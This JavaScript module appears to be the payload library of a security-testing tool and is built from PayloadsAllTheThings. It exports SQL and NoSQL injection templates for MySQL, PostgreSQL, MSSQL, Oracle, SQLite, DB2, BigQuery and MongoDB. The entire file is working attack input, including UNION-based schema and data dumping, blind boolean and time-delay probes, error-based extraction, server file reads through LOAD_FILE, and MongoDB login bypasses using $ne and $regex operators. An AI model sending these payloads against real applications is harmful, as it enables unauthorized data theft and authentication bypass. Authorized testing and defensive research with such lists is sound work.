// Curated text snippets based on the local PayloadsAllTheThings SQL and NoSQL references.
const entries = [];

function add(category, section, rows) {
  for (const [label, template] of rows) {
    entries.push({id: `db-${entries.length + 1}`, category, section, label, template});
  }
}

add('SQL-MySQL', 'Probe', [
  ['Single quote', "'"], ['Double quote', '"'],
  ['Boolean true', "' AND 1=1-- "], ['Boolean false', "' AND 1=2-- "],
  ['Numeric true', ' AND 7=7-- '], ['Numeric false', ' AND 7=8-- '],
  ['ORDER BY column', ' ORDER BY {{column_count}}-- '],
  ['UNION SELECT numbers', ' UNION SELECT {{number_columns}}-- '],
  ['UNION SELECT NULLs', ' UNION SELECT {{null_columns}}-- '],
  ['MySQL hash comment', "' OR 1=1#"], ['MySQL inline comment', '/**/']
]);
add('SQL-MySQL', 'Enumeration', [
  ['Version', 'VERSION()'], ['Current database', 'DATABASE()'], ['Current user', 'CURRENT_USER()'],
  ['User, DB, version', 'CONCAT_WS(0x3a,USER(),DATABASE(),VERSION())'],
  ['List databases', '(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)'],
  ['Count databases', '(SELECT COUNT(*) FROM information_schema.schemata)'],
  ['List tables', "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{{database}}')"],
  ['List columns', "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{{database}}' AND table_name='{{table}}')"],
  ['Aggregate rows', '(SELECT GROUP_CONCAT({{columns}}) FROM {{database}}.{{table}})'],
  ['Schema inventory', "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name)) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys'))"]
]);
add('SQL-MySQL', 'Boolean and time', [
  ['Conditional true', ' AND IF(1=1,1,0)=1-- '],
  ['Conditional false', ' AND IF(1=2,1,0)=1-- '],
  ['Time delay', ' AND SLEEP({{seconds}})-- '],
  ['Conditional delay', ' AND IF(1=1,SLEEP({{seconds}}),0)-- '],
  ['Substring check', " AND SUBSTRING(DATABASE(),1,1)='a'-- "]
]);
add('SQL-MySQL', 'Advanced', [
  ['File read, FILE privilege', "LOAD_FILE('{{file}}')"],
  ['Check FILE privilege', "(SELECT GROUP_CONCAT(CONCAT(grantee,':',privilege_type)) FROM information_schema.user_privileges WHERE privilege_type='FILE')"]
]);
add('SQL-MySQL', 'Legacy', [
  ['ExtractValue error, legacy', ' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- '],
  ['UpdateXML error, legacy', ' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- '],
  ['RAND group error, legacy', ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) AS marker FROM information_schema.tables GROUP BY marker) AS probe)-- ']
]);

add('SQL-PostgreSQL', 'Probe', [
  ['Single quote', "'"], ['Boolean true', "' AND 1=1-- "], ['Boolean false', "' AND 1=2-- "],
  ['ORDER BY column', ' ORDER BY {{column_count}}-- '],
  ['UNION SELECT NULLs', ' UNION SELECT {{null_columns}}-- '],
  ['String concatenation', "'a'||'b'"]
]);
add('SQL-PostgreSQL', 'Enumeration', [
  ['Version', 'version()'], ['Database', 'current_database()'], ['User', 'current_user'],
  ['List databases', "(SELECT string_agg(datname,',') FROM pg_database)"],
  ['List schemas', "(SELECT string_agg(schema_name,',') FROM information_schema.schemata)"],
  ['List tables', "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')"],
  ['List columns', "(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{{table}}')"],
  ['Schema inventory', "(SELECT string_agg(table_schema||'.'||table_name,',') FROM information_schema.tables)"]
]);
add('SQL-PostgreSQL', 'Boolean and time', [
  ['Cast error', ' AND 1=CAST(version() AS INTEGER)-- '],
  ['Substring check', " AND substring(current_database(),1,1)='a'-- "],
  ['Time delay', '; SELECT pg_sleep({{seconds}})-- '],
  ['Conditional delay', ' AND 1=(SELECT 1 FROM pg_sleep({{seconds}}))-- ']
]);

add('SQL-MSSQL', 'Probe', [
  ['Single quote', "'"], ['Boolean true', "' AND 1=1-- "], ['Boolean false', "' AND 1=2-- "],
  ['ORDER BY column', ' ORDER BY {{column_count}}-- '],
  ['UNION SELECT NULLs', ' UNION SELECT {{null_columns}}-- '],
  ['Stacked statement separator', ';']
]);
add('SQL-MSSQL', 'Enumeration', [
  ['Version', '@@VERSION'], ['Database', 'DB_NAME()'], ['User', 'SYSTEM_USER'],
  ['List databases, SQL Server 2017+', "(SELECT STRING_AGG(name,',') FROM sys.databases)"],
  ['List tables, SQL Server 2017+', "(SELECT STRING_AGG(name,',') FROM sys.tables)"],
  ['List columns, SQL Server 2017+', "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('{{table}}'))"],
  ['First database', '(SELECT TOP 1 name FROM sys.databases)'],
  ['First table', '(SELECT TOP 1 name FROM sys.tables)']
]);
add('SQL-MSSQL', 'Boolean and time', [
  ['Conversion error', ' AND 1=CONVERT(INT,@@VERSION)-- '],
  ['Substring check', " AND SUBSTRING(DB_NAME(),1,1)='a'-- "],
  ['WAITFOR delay', "; WAITFOR DELAY '00:00:{{seconds}}'-- "]
]);

add('SQL-Oracle', 'Probe', [
  ['Single quote', "'"], ['Boolean true', "' AND 1=1--"], ['Boolean false', "' AND 1=2--"],
  ['ORDER BY column', ' ORDER BY {{column_count}}--'],
  ['UNION SELECT NULLs FROM dual', ' UNION SELECT {{null_columns}} FROM dual--'],
  ['String concatenation', "'a'||'b'"]
]);
add('SQL-Oracle', 'Enumeration', [
  ['Version', '(SELECT banner FROM v$version WHERE ROWNUM=1)'],
  ['Current user', 'USER'], ['Database name', 'SYS_CONTEXT(\'USERENV\',\'DB_NAME\')'],
  ['First table', '(SELECT table_name FROM all_tables WHERE ROWNUM=1)'],
  ['First column', "(SELECT column_name FROM all_tab_columns WHERE table_name='{{table}}' AND ROWNUM=1)"],
  ['First schema', '(SELECT username FROM all_users WHERE ROWNUM=1)']
]);
add('SQL-Oracle', 'Boolean and time', [
  ['Substring check', " AND SUBSTR(USER,1,1)='A'--"],
  ['DBMS_PIPE delay', " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('probe',{{seconds}})--"]
]);

add('SQL-SQLite', 'Probe', [
  ['Single quote', "'"], ['Boolean true', "' AND 1=1--"], ['Boolean false', "' AND 1=2--"],
  ['ORDER BY column', ' ORDER BY {{column_count}}--'],
  ['UNION SELECT NULLs', ' UNION SELECT {{null_columns}}--'],
  ['String concatenation', "'a'||'b'"]
]);
add('SQL-SQLite', 'Enumeration', [
  ['Version', 'sqlite_version()'],
  ['List tables', "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"],
  ['Table schema', "(SELECT sql FROM sqlite_master WHERE name='{{table}}')"],
  ['Table columns', "(SELECT group_concat(name) FROM pragma_table_info('{{table}}'))"],
  ['List indexes', "(SELECT group_concat(name) FROM sqlite_master WHERE type='index')"]
]);
add('SQL-SQLite', 'Boolean', [
  ['Substring check', " AND substr(sqlite_version(),1,1)='3'--"],
  ['Hex string', "CAST(X'70726f6265' AS TEXT)"]
]);

add('SQL-DB2', 'Probe and enumeration', [
  ['Statement comment', '--'],
  ['Version from SYSIBM', "SELECT getvariable('sysibm.version') FROM sysibm.sysdummy1"],
  ['Current user', 'SELECT user FROM sysibm.sysdummy1'],
  ['Current server', 'SELECT current server FROM sysibm.sysdummy1'],
  ['Table names', 'SELECT name FROM sysibm.systables'],
  ['Substring check', "SELECT substr('abc',2,1) FROM sysibm.sysdummy1"]
]);

add('SQL-BigQuery', 'Probe and enumeration', [
  ['Statement comment', '--'],
  ['Project ID', 'SELECT @@project_id'],
  ['Project ID cast error', 'SELECT CAST(@@project_id AS INT64)'],
  ['UNION probe', ' UNION ALL SELECT {{number_columns}}--'],
  ['Column prefix check', "' WHERE SUBSTRING((SELECT column_name FROM `project.dataset.table` LIMIT 1),1,1)='A'#"]
]);

add('NoSQL-MongoDB', 'JSON operators', [
  ['Not equal null login check', '{"username":{"$ne":null},"password":{"$ne":null}}'],
  ['Greater than empty login check', '{"username":{"$gt":""},"password":{"$gt":""}}'],
  ['Equality and regex', '{"username":{"$eq":"admin"},"password":{"$regex":"^m"}}'],
  ['Regex prefix', '{"password":{"$regex":"^{{selected}}"}}'],
  ['Regex length', '{"password":{"$regex":".{3}"}}'],
  ['Numeric comparison', '{"price":{"$gt":0}}'],
  ['Match one of several names', '{"username":{"$in":["admin","root","administrator"]}}'],
  ['Duplicate JSON keys, keep raw', '{"id":"10","id":"100"}']
]);
add('NoSQL-MongoDB', 'Form operators', [
  ['Not equal credentials', 'username[$ne]=toto&password[$ne]=toto'],
  ['Regex length', 'username[$ne]=toto&password[$regex]=.{3}'],
  ['Regex prefix', 'username[$ne]=toto&password[$regex]=^m'],
  ['Greater than value', 'price[$gt]=0']
]);
add('NoSQL-MongoDB', 'Expression checks', [
  ['Where true, server-side JS required', '{"$where":"this.password.length > 0"}'],
  ['Where false, server-side JS required', '{"$where":"this.password.length < 0"}']
]);

export const DB_PAYLOADS = entries;
